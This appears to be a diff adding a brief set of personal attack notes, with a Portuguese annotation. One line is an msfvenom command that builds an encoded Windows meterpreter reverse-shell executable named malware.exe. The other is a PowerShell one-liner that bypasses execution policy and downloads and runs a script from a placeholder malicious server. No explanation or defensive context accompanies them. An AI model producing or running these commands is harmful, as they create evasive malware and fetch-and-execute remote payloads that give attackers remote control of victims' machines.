@@ -1,0 +1,8 @@
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.222 lport=4444 -e x86/shikata_ga_nai -i 10 -f exe -o malware.exe 
+
+*no windows
+
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<http://servidor-malicioso.com/payload.ps1>')"
+
+........................................................................................
+
